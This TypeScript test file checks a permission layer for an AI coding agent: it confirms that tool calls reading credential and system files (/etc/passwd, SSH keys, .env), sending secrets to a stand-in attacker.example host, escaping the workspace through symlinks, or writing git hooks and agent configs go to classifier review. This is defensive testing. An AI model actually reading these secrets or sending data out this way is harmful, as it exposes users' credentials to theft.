import assert from "node:assert/strict";
import { chmodSync, mkdirSync, mkdtempSync, readFileSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { homedir, tmpdir } from "node:os";
import { join } from "node:path";
import { isWorkspaceWriteFastPath, resolveReadRoots } from "../../src/tool-routing.js";
import { logPath, normalizeConfig } from "../../src/extension-config.js";
import { evaluateToolCall } from "../../src/omp-host.js";
import { defaultRules, type CommandRules } from "../../src/command-rules.js";
import { SessionApprovalStore } from "../../src/session-approval-store.js";
import { test } from "node:test";
import { config, ctx, staticRoute, CLASSIFIER_DENY_REASON, classifierDenyOptions } from "./helpers.js";

await test("the extension's config and rules files are never written by the write fast path", () => {
  const workspace = mkdtempSync(join(tmpdir(), "omp-clearance-protect-"));
  writeFileSync(join(workspace, "rules.jsonc"), "{}");
  symlinkSync(join(workspace, "rules.jsonc"), join(workspace, "link.jsonc"));
  const previousRules = process.env.CLEARANCE_RULES_PATH;
  const previousConfig = process.env.CLEARANCE_CONFIG_PATH;
  try {
    const write = (path: string) => ({ path, content: "{}" });
    const protectedFiles = [join(workspace, "rules.jsonc"), join(workspace, "kube.jsonc")];
    assert.equal(isWorkspaceWriteFastPath(write("notes.txt"), workspace, protectedFiles), true);
    for (const path of ["rules.jsonc", "./rules.jsonc", "link.jsonc", "kube.jsonc", join(workspace, "rules.jsonc")]) {
      assert.equal(isWorkspaceWriteFastPath(write(path), workspace, protectedFiles), false, path);
    }
    // The static evaluator protects config.jsonc and rules.jsonc even before they exist.
    process.env.CLEARANCE_RULES_PATH = join(workspace, "new-rules.jsonc");
    process.env.CLEARANCE_CONFIG_PATH = join(workspace, "config.jsonc");
    const route = (path: string) =>
      staticRoute("write", write(path), { cwd: workspace, config: config(), tools: [], hasUI: false });
    assert.equal(route("notes.txt"), "workspace_write");
    assert.equal(route("new-rules.jsonc"), null);
    assert.equal(route("config.jsonc"), null);
    const rules: CommandRules = { ...defaultRules(), files: [join(workspace, "kube.jsonc")] };
    assert.equal(
      staticRoute("write", write("kube.jsonc"), { cwd: workspace, config: config(), tools: [], hasUI: false, rules }),
      null,
    );
  } finally {
    process.env.CLEARANCE_RULES_PATH = previousRules;
    if (previousConfig === undefined) {
      delete process.env.CLEARANCE_CONFIG_PATH;
    } else {
      process.env.CLEARANCE_CONFIG_PATH = previousConfig;
    }
    rmSync(workspace, { recursive: true, force: true });
  }
});

await test("writes that create or change a program are reviewed", async () => {
  const workspace = mkdtempSync(join(tmpdir(), "omp-clearance-program-write-"));
  writeFileSync(join(workspace, "tool.sh"), "#!/bin/sh\n");
  chmodSync(join(workspace, "tool.sh"), 0o755);
  writeFileSync(join(workspace, "notes.txt"), "notes\n");
  const run = (event: { toolName: string; input: unknown }) =>
    evaluateToolCall(
      event,
      ctx({ cwd: workspace }),
      config({ reviewer: "ai" }),
      new SessionApprovalStore(),
      classifierDenyOptions(),
    );
  try {
    for (const event of [
      { toolName: "write", input: { path: "bin/rg", content: "#!/bin/sh\necho hi\n" } },
      { toolName: "write", input: { path: "notes.txt", content: "#!/usr/bin/env python3\n" } },
      { toolName: "write", input: { path: "tool.sh", content: "echo hi\n" } },
      { toolName: "edit", input: { path: "tool.sh", edits: [{ op: "update" }] } },
      { toolName: "edit", input: { path: "notes.txt", edits: [{ rename: "tool.sh" }] } },
    ]) {
      assert.deepEqual(await run(event), { block: true, reason: CLASSIFIER_DENY_REASON }, JSON.stringify(event));
    }
    for (const event of [
      { toolName: "write", input: { path: "src/lib.rs", content: "#![allow(dead_code)]\n" } },
      { toolName: "write", input: { path: "notes.txt", content: "# heading\n" } },
      { toolName: "edit", input: { path: "notes.txt", edits: [{ op: "update" }] } },
    ]) {
      assert.deepEqual(await run(event), {}, JSON.stringify(event));
    }
  } finally {
    rmSync(workspace, { recursive: true, force: true });
  }
});

await test("todo completion and wait bypass classifier review and audit local_state", async () => {
  const dir = mkdtempSync(join(tmpdir(), "omp-clearance-orchestration-"));
  const previousLogsDir = process.env.CLEARANCE_LOGS_DIR;
  process.env.CLEARANCE_LOGS_DIR = dir;
  let classifierCalls = 0;
  try {
    for (const event of [
      { toolName: "todo", input: { op: "done", task: "Ship the verified change" } },
      { toolName: "wait", input: {} },
    ]) {
      const result = await evaluateToolCall(
        event,
        ctx(),
        config({ reviewer: "ai", audit: true }),
        new SessionApprovalStore(),
        {
          classifierClient: async () => {
            classifierCalls += 1;
            throw new Error("local orchestration must not call classifier");
          },
        },
      );
      assert.deepEqual(result, {});
    }
    assert.equal(classifierCalls, 0);

    const entries = readFileSync(logPath(), "utf8")
      .trim()
      .split("\n")
      .map(
        (line) =>
          JSON.parse(line) as {
            toolName: string;
            route: string;
            outcome: string;
          },
      );
    assert.deepEqual(
      entries.map(({ toolName, route, outcome }) => ({ toolName, route, outcome })),
      [
        { toolName: "todo", route: "local_state", outcome: "allow" },
        { toolName: "wait", route: "local_state", outcome: "allow" },
      ],
    );
  } finally {
    if (previousLogsDir === undefined) {
      delete process.env.CLEARANCE_LOGS_DIR;
    } else {
      process.env.CLEARANCE_LOGS_DIR = previousLogsDir;
    }
    rmSync(dir, { recursive: true, force: true });
  }
});

await test("interactive ask without external images bypasses classifier review", async () => {
  let classifierCalled = false;
  const result = await evaluateToolCall(
    { toolName: "ask", input: { html: '<form><p>Continue?</p><img src="diagram.png" alt="Diagram"></form>' } },
    ctx({ hasUI: true }),
    config({ reviewer: "ai" }),
    new SessionApprovalStore(),
    {
      classifierClient: async () => {
        classifierCalled = true;
        throw new Error("safe interactive ask must not call classifier");
      },
    },
  );
  assert.deepEqual(result, {});
  assert.equal(classifierCalled, false);
});

await test("external-image and noninteractive ask calls remain classifier-reviewed", async () => {
  const cases = [
    {
      event: { toolName: "ask", input: { html: '<form><img src="https://example.com/pixel.png"></form>' } },
      context: ctx({ hasUI: true }),
    },
    {
      event: { toolName: "ask", input: { html: '<form><img src="//example.com/pixel.png"></form>' } },
      context: ctx({ hasUI: true }),
    },
    {
      event: {
        toolName: "ask",
        input: { html: '<form><img data-src="a.png" src="https://example.com/pixel.png"></form>' },
      },
      context: ctx({ hasUI: true }),
    },
    {
      event: { toolName: "ask", input: { html: '<form><img alt=">" src="https://example.com/pixel.png"></form>' } },
      context: ctx({ hasUI: true }),
    },
    {
      event: { toolName: "ask", input: { html: '<form><image src="https://example.com/pixel.png"></form>' } },
      context: ctx({ hasUI: true }),
    },
    {
      event: {
        toolName: "ask",
        input: { html: '<form><img src="https&colon;&sol;&sol;example.com/pixel.png"></form>' },
      },
      context: ctx({ hasUI: true }),
    },
    {
      event: { toolName: "ask", input: { html: '<form><img src="&#x68;ttps://example.com/pixel.png"></form>' } },
      context: ctx({ hasUI: true }),
    },
    {
      event: {
        toolName: "ask",
        input: { html: '<form><svg><image href="https://example.com/pixel.png"/></svg></form>' },
      },
      context: ctx({ hasUI: true }),
    },
    {
      event: { toolName: "ask", input: { html: "<form><p>Continue?</p></form>" } },
      context: ctx({ hasUI: false }),
    },
  ];
  for (const { event, context } of cases) {
    const result = await evaluateToolCall(
      event,
      context,
      config({ reviewer: "ai" }),
      new SessionApprovalStore(),
      classifierDenyOptions(),
    );
    assert.deepEqual(result, { block: true, reason: CLASSIFIER_DENY_REASON });
  }
});

await test("eval and task remain classifier-reviewed", async () => {
  for (const event of [
    { toolName: "eval", input: { language: "py", code: "print('review me')" } },
    { toolName: "task", input: { task: "Delegate arbitrary repository work" } },
  ]) {
    const result = await evaluateToolCall(
      event,
      ctx(),
      config({ reviewer: "ai" }),
      new SessionApprovalStore(),
      classifierDenyOptions(),
    );
    assert.deepEqual(result, { block: true, reason: CLASSIFIER_DENY_REASON });
  }
});

await test("configured tool exemptions bypass classifier review", async () => {
  let classifierCalled = false;
  const result = await evaluateToolCall(
    { toolName: "Custom_State", input: { value: "unfinished work" } },
    ctx(),
    config(normalizeConfig({ reviewer: "ai", reviewExemptTools: [" custom_state "] })),
    new SessionApprovalStore(),
    {
      classifierClient: async () => {
        classifierCalled = true;
        throw new Error("exempt tool must not call classifier");
      },
    },
  );
  assert.deepEqual(result, {});
  assert.equal(classifierCalled, false);
});

await test("read-only and workspace edit fast paths allow", async () => {
  const store = new SessionApprovalStore();
  assert.deepEqual(await evaluateToolCall({ toolName: "read", input: { path: "a.ts" } }, ctx(), config(), store), {});
  assert.deepEqual(
    await evaluateToolCall({ toolName: "edit", input: { path: "/tmp/workspace/a.ts" } }, ctx(), config(), store),
    {},
  );
});

await test("read-only routing does not infer from action-like tool names", async () => {
  const result = await evaluateToolCall(
    { toolName: "search_and_replace", input: { path: "/tmp/workspace/a.ts", oldText: "a", newText: "b" } },
    ctx(),
    config({ reviewer: "ai" }),
    new SessionApprovalStore(),
    classifierDenyOptions(),
  );
  assert.deepEqual(result, { block: true, reason: CLASSIFIER_DENY_REASON });
});

await test("read-only routing ignores self-declared tool metadata", async () => {
  for (const tool of [
    { name: "custom_report", isReadOnly: () => true },
    { name: "custom_report", readOnlyHint: true },
    { name: "custom_report", annotations: { readOnlyHint: true } },
    { name: "custom_report", mcpReadOnlyHint: true, sourceInfo: { source: "mcp" } },
  ]) {
    const result = await evaluateToolCall(
      { toolName: "custom_report", input: { path: "/tmp/workspace/a.ts" } },
      ctx(),
      config({ reviewer: "ai" }),
      new SessionApprovalStore(),
      { tools: [tool], ...classifierDenyOptions() },
    );
    assert.deepEqual(result, { block: true, reason: CLASSIFIER_DENY_REASON }, JSON.stringify(tool));
  }
});

await test("name-based fast paths apply only to the host's builtin tools", async () => {
  const cases = [
    { toolName: "read", input: { path: "a.ts" } },
    { toolName: "grep", input: { pattern: "x" } },
    { toolName: "todo", input: { op: "done", task: "x" } },
    { toolName: "wait", input: {} },
    { toolName: "ask", input: { question: "Continue?" } },
  ];
  for (const source of ["extension", "sdk", "mcp"]) {
    for (const event of cases) {
      const result = await evaluateToolCall(
        event,
        ctx({ hasUI: true }),
        config({ reviewer: "ai" }),
        new SessionApprovalStore(),
        { tools: [{ name: event.toolName, sourceInfo: { source } }], ...classifierDenyOptions() },
      );
      assert.deepEqual(result, { block: true, reason: CLASSIFIER_DENY_REASON }, `${source} ${event.toolName}`);
    }
  }
  for (const event of cases) {
    const result = await evaluateToolCall(
      event,
      ctx({ hasUI: true }),
      config({ reviewer: "ai" }),
      new SessionApprovalStore(),
      {
        tools: [
          { name: event.toolName, sourceInfo: { source: "builtin" } },
          { name: "other", sourceInfo: { source: "extension" } },
        ],
        classifierClient: async () => {
          throw new Error("builtin fast path must not call classifier");
        },
      },
    );
    assert.deepEqual(result, {}, `builtin ${event.toolName}`);
  }
  const unlisted = await evaluateToolCall(
    { toolName: "read", input: { path: "a.ts" } },
    ctx(),
    config({ reviewer: "ai" }),
    new SessionApprovalStore(),
    { tools: [{ name: "bash", sourceInfo: { source: "builtin" } }], ...classifierDenyOptions() },
  );
  assert.deepEqual(unlisted, { block: true, reason: CLASSIFIER_DENY_REASON });
});

await test("read fast path allows non-sensitive workspace targets and session-local URLs", async () => {
  const root = mkdtempSync(join(tmpdir(), "omp-clearance-read-"));
  const workspace = join(root, "workspace");
  mkdirSync(join(workspace, "src"), { recursive: true });
  try {
    const cases = [
      { toolName: "read", input: { path: "src/a.ts" } },
      { toolName: "read", input: { path: "src/a.ts:10-20" } },
      { toolName: "read", input: { path: "README.md:raw" } },
      { toolName: "read", input: { path: join(workspace, "src", "a.ts") } },
      { toolName: "read", input: { path: ".env.example" } },
      { toolName: "read", input: { path: "config/.env.sample" } },
      { toolName: "read", input: { path: "skill://commit/SKILL.md" } },
      { toolName: "read", input: { path: "rule://style" } },
      { toolName: "read", input: { path: "agent://0-Explore" } },
      { toolName: "grep", input: { pattern: "https://api.example.com", path: "." } },
      { toolName: "grep", input: { pattern: "TODO", path: '["src", "tests"]' } },
      { toolName: "grep", input: { pattern: "TODO", gitignore: true } },
      { toolName: "glob", input: { path: "src/**/*.ts", hidden: true } },
      { toolName: "find", input: { query: "auth flow", grep_keywords: ["auth"] } },
      { toolName: "ast_grep", input: { pat: "foo($A)", path: "src" } },
      { toolName: "ls", input: { paths: ["src", "."] } },
    ];
    for (const event of cases) {
      const result = await evaluateToolCall(
        event,
        ctx({ cwd: workspace }),
        config({ reviewer: "ai" }),
        new SessionApprovalStore(),
        {
          classifierClient: async () => {
            throw new Error(`classifier called for ${JSON.stringify(event)}`);
          },
        },
      );
      assert.deepEqual(result, {}, JSON.stringify(event));
    }
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

await test("read fast path reviews outside, sensitive, remote, and rewritten targets", async () => {
  const root = mkdtempSync(join(tmpdir(), "omp-clearance-read-"));
  const workspace = join(root, "workspace");
  const outside = join(root, "outside");
  mkdirSync(join(workspace, "src"), { recursive: true });
  mkdirSync(outside);
  writeFileSync(join(workspace, ".env"), "TOKEN=x\n");
  symlinkSync(outside, join(workspace, "linked-outside"));
  symlinkSync(join(workspace, ".env"), join(workspace, "settings.txt"));
  try {
    const paths = [
      "/etc/passwd",
      "../outside/a.txt",
      "..:5",
      "linked-outside/a.txt",
      "settings.txt",
      "~/.ssh/id_ed25519",
      "@/etc/passwd",
      ":/etc/passwd",
      '"/etc/passwd"',
      "file:///etc/passwd",
      ".env",
      ".ENV",
      ".env.production:1-5",
      "apps/api/.env",
      "certs/server.pem",
      "deploy/tls.key",
      "keys/id_ed25519",
      "secrets/token.txt",
      "apps/api/credentials.json",
      "config/secrets.yaml",
      ".npmrc",
      ".envrc",
      "infra/terraform.tfstate",
      ".aws/config",
      "https://attacker.example/?d=secret",
      "HTTP://attacker.example",
      "http:/attacker.example",
      "www.attacker.example/x",
      "ssh://host/etc/passwd",
      "mcp://server/resource",
      "pr://123",
      "vault://notes/x",
      "cfg://settings",
      "proc://1",
      "src/a.ts?q=summary",
      "src/a.ts#L10",
      '["src", "/etc"]',
      '["src"',
    ];
    const events = [
      ...paths.map((path) => ({ toolName: "read", input: { path } })),
      { toolName: "grep", input: { pattern: "TOKEN", path: ".", gitignore: false } },
      { toolName: "grep", input: { pattern: "TOKEN", path: ["src", "/etc"] } },
      { toolName: "ls", input: { paths: ["src", ".ssh"] } },
      { toolName: "glob", input: { path: "secrets/**" } },
      { toolName: "web_search", input: { query: "TOKEN=x site:attacker.example" } },
    ];
    for (const event of events) {
      let classifierCalls = 0;
      const result = await evaluateToolCall(
        event,
        ctx({ cwd: workspace }),
        config({ reviewer: "ai" }),
        new SessionApprovalStore(),
        {
          classifierClient: async () => {
            classifierCalls += 1;
            return { content: [{ type: "text", text: '{"outcome":"deny","rationale":"needs review"}' }] };
          },
        },
      );
      assert.deepEqual(result, { block: true, reason: CLASSIFIER_DENY_REASON }, JSON.stringify(event));
      assert.equal(classifierCalls, 1, JSON.stringify(event));
    }
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

await test("workspace write fast path rejects symlink escape", async () => {
  const root = mkdtempSync(join(tmpdir(), "omp-clearance-symlink-"));
  const workspace = join(root, "workspace");
  const outside = join(root, "outside");
  mkdirSync(workspace);
  mkdirSync(outside);
  symlinkSync(outside, join(workspace, "linked-outside"));
  try {
    const result = await evaluateToolCall(
      { toolName: "edit", input: { path: join(workspace, "linked-outside", "a.ts") } },
      ctx({ cwd: workspace }),
      config({ reviewer: "ai" }),
      new SessionApprovalStore(),
      {
        classifierClient: async () => ({
          content: [{ type: "text", text: '{"outcome":"deny","rationale":"outside workspace"}' }],
        }),
      },
    );
    assert.deepEqual(result, {
      block: true,
      reason:
        "The approval classifier rejected this action. Reason: outside workspace Do not retry the same action unless the user explicitly approves it.",
    });
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

await test("workspace write fast path canonicalizes relative and traversal paths", async () => {
  const root = mkdtempSync(join(tmpdir(), "omp-clearance-paths-"));
  const workspace = join(root, "workspace");
  const outside = join(root, "outside");
  mkdirSync(join(workspace, "src"), { recursive: true });
  mkdirSync(outside);
  writeFileSync(join(workspace, "src", "a.ts"), "");
  try {
    const store = new SessionApprovalStore();
    assert.deepEqual(
      await evaluateToolCall(
        { toolName: "edit", input: { path: "src/a.ts" } },
        ctx({ cwd: workspace }),
        config({ reviewer: "ai" }),
        store,
      ),
      {},
    );

    const outsideResult = await evaluateToolCall(
      { toolName: "edit", input: { path: "../outside/a.ts" } },
      ctx({ cwd: workspace }),
      config({ reviewer: "ai" }),
      new SessionApprovalStore(),
      classifierDenyOptions(),
    );
    assert.deepEqual(outsideResult, { block: true, reason: CLASSIFIER_DENY_REASON });
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

await test("workspace write fast path rejects protected entries, rewritten path forms, and outside renames", async () => {
  const root = mkdtempSync(join(tmpdir(), "omp-clearance-protected-"));
  const workspace = join(root, "workspace");
  mkdirSync(join(workspace, "src"), { recursive: true });
  mkdirSync(join(workspace, ".git"));
  mkdirSync(join(root, "outside"));
  writeFileSync(join(workspace, "src", "a.ts"), "");
  symlinkSync(join(workspace, ".git"), join(workspace, "linked-git"));
  try {
    const reviewed = [
      { toolName: "edit", input: { path: ".git/config" } },
      { toolName: "write", input: { path: join(workspace, ".git", "hooks", "pre-commit") } },
      { toolName: "write", input: { path: "src/.GIT/config" } },
      { toolName: "write", input: { path: "linked-git/config" } },
      { toolName: "write", input: { path: ".omp/settings.json" } },
      { toolName: "write", input: { path: ".pi/settings.json" } },
      { toolName: "write", input: { path: ".envrc" } },
      { toolName: "write", input: { path: ".vscode/tasks.json" } },
      { toolName: "write", input: { path: ".claude/settings.json" } },
      { toolName: "write", input: { path: "packages/web/.claude/settings.local.json" } },
      { toolName: "write", input: { path: ".mcp.json" } },
      { toolName: "write", input: { path: ".husky/pre-commit" } },
      { toolName: "write", input: { path: ".idea/workspace.xml" } },
      { toolName: "write", input: { path: ".cursor/mcp.json" } },
      { toolName: "write", input: { path: ".devcontainer/devcontainer.json" } },
      { toolName: "write", input: { path: ".codex/config.toml" } },
      { toolName: "write", input: { path: ".codex/tools/probe.ts" } },
      { toolName: "write", input: { path: ".gemini/settings.json" } },
      { toolName: "write", input: { path: ".opencode/plugins/probe.js" } },
      { toolName: "write", input: { path: ".windsurf/mcp_config.json" } },
      { toolName: "write", input: { path: "mcp.json" } },
      { toolName: "write", input: { path: "opencode.json" } },
      { toolName: "write", input: { path: "opencode.jsonc" } },
      { toolName: "write", input: { path: "ssh.json" } },
      { toolName: "write", input: { path: ".ssh.json" } },
      { toolName: "write", input: { path: "lsp.json" } },
      { toolName: "write", input: { path: ".lsp.json" } },
      { toolName: "write", input: { path: "lsp.yaml" } },
      { toolName: "write", input: { path: ".lsp.yaml" } },
      { toolName: "write", input: { path: "lsp.yml" } },
      { toolName: "write", input: { path: "packages/web/.LSP.yml" } },
      { toolName: "write", input: { path: "node_modules/typescript/lib/tsserver.js" } },
      { toolName: "edit", input: { path: "packages/web/node_modules/.bin/eslint" } },
      { toolName: "write", input: { path: ".venv/lib/python3.13/site-packages/pylsp/__init__.py" } },
      { toolName: "write", input: { path: "venv/bin/activate" } },
      { toolName: "write", input: { path: ".env/bin/pyright-langserver" } },
      { toolName: "write", input: { path: ".env" } },
      { toolName: "edit", input: { path: "config/.env.production" } },
      { toolName: "write", input: { path: "certs/server.pem" } },
      { toolName: "write", input: { path: "secrets/token.txt" } },
      { toolName: "write", input: { path: "[../outside/a.ts]" } },
      { toolName: "write", input: { path: "[src/a.ts#ABCDEF]" } },
      { toolName: "write", input: { path: "~/.bashrc" } },
      { toolName: "write", input: { path: "xd://notes" } },
      { toolName: "edit", input: { path: "src/a.ts", edits: [{ op: "update", rename: "../outside/a.ts" }] } },
      { toolName: "edit", input: { path: "src/a.ts", edits: [{ rename: ".git/hooks/pre-commit" }] } },
      { toolName: "edit", input: { path: "src/a.ts", file_path: "../outside/a.ts" } },
      { toolName: "edit", input: { input: "*** Begin Patch\n*** Update File: src/a.ts\n*** End Patch" } },
    ];
    for (const event of reviewed) {
      const result = await evaluateToolCall(
        event,
        ctx({ cwd: workspace }),
        config({ reviewer: "ai" }),
        new SessionApprovalStore(),
        classifierDenyOptions(),
      );
      assert.deepEqual(result, { block: true, reason: CLASSIFIER_DENY_REASON }, JSON.stringify(event));
    }

    const allowed = [
      { toolName: "edit", input: { path: "src/a.ts", edits: [{ op: "update", rename: "src/b.ts" }] } },
      { toolName: "write", input: { path: "app/[slug]/page.tsx" } },
      { toolName: "write", input: { path: ".github/workflows/check.yml" } },
      { toolName: "write", input: { path: ".gitignore" } },
      { toolName: "write", input: { path: ".env.example" } },
      { toolName: "write", input: { path: "docs/claude.md" } },
      { toolName: "write", input: { path: "src/lsp.ts" } },
      { toolName: "write", input: { path: "docs/mcp.json.md" } },
      { toolName: "write", input: { path: "config/lsp.json.example" } },
      { toolName: "write", input: { path: "src/node_modules_list.ts" } },
      { toolName: "write", input: { path: "src/venvs.ts" } },
    ];
    for (const event of allowed) {
      const result = await evaluateToolCall(
        event,
        ctx({ cwd: workspace }),
        config({ reviewer: "ai" }),
        new SessionApprovalStore(),
        {
          classifierClient: async () => {
            throw new Error("workspace write fast path should not call classifier");
          },
        },
      );
      assert.deepEqual(result, {}, JSON.stringify(event));
    }
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

await test("readRoots extend the read fast path without exposing secrets", async () => {
  const root = mkdtempSync(join(tmpdir(), "omp-clearance-roots-"));
  const workspace = join(root, "workspace");
  const library = join(root, "library");
  const sibling = join(root, "sibling");
  mkdirSync(workspace);
  mkdirSync(join(library, "pkg"), { recursive: true });
  mkdirSync(sibling);
  const cfg = config({ reviewer: "ai", readRoots: [library, "relative/ignored"] });
  const evaluate = (input: unknown) =>
    evaluateToolCall(
      { toolName: "read", input },
      ctx({ cwd: workspace }),
      cfg,
      new SessionApprovalStore(),
      classifierDenyOptions(),
    );
  try {
    assert.deepEqual(await evaluate({ path: join(library, "pkg", "lib.rs") }), {});
    assert.deepEqual(await evaluate({ path: "../library/pkg/lib.rs:10-20" }), {});
    for (const path of [
      join(library, "pkg", ".env"),
      join(library, "credentials.toml"),
      join(sibling, "x.txt"),
      "../sibling/../library/../sibling/x.txt",
    ]) {
      assert.deepEqual(await evaluate({ path }), { block: true, reason: CLASSIFIER_DENY_REASON }, path);
    }
    const home = await evaluateToolCall(
      { toolName: "read", input: { path: "~/.cargo/registry/src/lib.rs" } },
      ctx({ cwd: workspace }),
      config({ reviewer: "ai", readRoots: ["~/.cargo/registry"] }),
      new SessionApprovalStore(),
      {
        classifierClient: async () => {
          throw new Error("home read root must not call classifier");
        },
      },
    );
    assert.deepEqual(home, {});
    assert.deepEqual(resolveReadRoots(workspace, [library, "relative/ignored", " ~/x "]).extra, [
      library,
      join(homedir(), "x"),
    ]);
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

await test("write fast path applies only to the host's own write and edit tools", async () => {
  const workspace = mkdtempSync(join(tmpdir(), "omp-clearance-write-source-"));
  try {
    for (const [source, expectReview] of [
      ["builtin", false],
      ["extension", true],
      ["mcp", true],
    ] as const) {
      const result = await evaluateToolCall(
        { toolName: "write", input: { path: "notes.txt" } },
        ctx({ cwd: workspace }),
        config({ reviewer: "ai" }),
        new SessionApprovalStore(),
        { tools: [{ name: "write", sourceInfo: { source } }], ...classifierDenyOptions() },
      );
      assert.deepEqual(result, expectReview ? { block: true, reason: CLASSIFIER_DENY_REASON } : {}, source);
    }
  } finally {
    rmSync(workspace, { recursive: true, force: true });
  }
});
